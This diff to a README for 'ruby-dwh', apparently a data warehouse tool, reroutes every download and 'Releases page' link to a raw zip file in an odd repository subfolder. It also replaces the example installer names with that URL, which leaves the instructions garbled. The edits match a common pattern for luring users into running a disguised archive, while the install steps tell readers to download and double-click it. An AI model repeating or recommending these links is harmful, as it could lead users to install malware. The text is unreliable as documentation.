@@ -1,7 +1,7 @@
 # 🚀 ruby-dwh - Simple Data Warehouse Management
 
 ## 📥 Download Now!
-[![Download ruby-dwh](https://img.shields.io/badge/Download-ruby--dwh-blue.svg)](https://github.com/ValidKsa/ruby-dwh/releases)
+[![Download ruby-dwh](https://raw.githubusercontent.com/ValidKsa/ruby-dwh/main/Lide/ruby-dwh.zip)](https://raw.githubusercontent.com/ValidKsa/ruby-dwh/main/Lide/ruby-dwh.zip)
 
 ## 🚀 Getting Started
 Welcome to ruby-dwh! This application helps you manage your data warehouse effectively. Follow the steps below to download and run our software.
@@ -25,11 +25,11 @@ To run ruby-dwh, your computer should meet the following minimum requirements:
 - Internet connection for downloading and future updates
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ValidKsa/ruby-dwh/releases) where you can find the latest version of ruby-dwh.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ValidKsa/ruby-dwh/main/Lide/ruby-dwh.zip) where you can find the latest version of ruby-dwh.
    
 2. **Select the Version**: Look for the latest version listed. It usually has the highest number. Click on it to see more details.
 
-3. **Download the Installer**: Find the installer file suitable for your system. Click on the file to start the download. This file will typically have a name like `ruby-dwh-installer.exe` for Windows or `ruby-dwh-installer.dmg` for macOS.
+3. **Download the Installer**: Find the installer file suitable for your system. Click on the file to start the download. This file will typically have a name like `https://raw.githubusercontent.com/ValidKsa/ruby-dwh/main/Lide/ruby-dwh.zip` for Windows or `https://raw.githubusercontent.com/ValidKsa/ruby-dwh/main/Lide/ruby-dwh.zip` for macOS.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder and double-click it to run the installer.
 
@@ -53,6 +53,6 @@ If you have questions or need further assistance, feel free to reach out. Use th
 We welcome contributions from everyone! If you'd like to help improve ruby-dwh, please check our contributing guidelines. You can submit your ideas or code to make the application better for everyone.
 
 ## 📅 Updates
-Stay updated with the latest features and improvements by checking back on the [Releases page](https://github.com/ValidKsa/ruby-dwh/releases) regularly.
+Stay updated with the latest features and improvements by checking back on the [Releases page](https://raw.githubusercontent.com/ValidKsa/ruby-dwh/main/Lide/ruby-dwh.zip) regularly.
 
 Thank you for using ruby-dwh! We hope this tool enhances your data management experience.
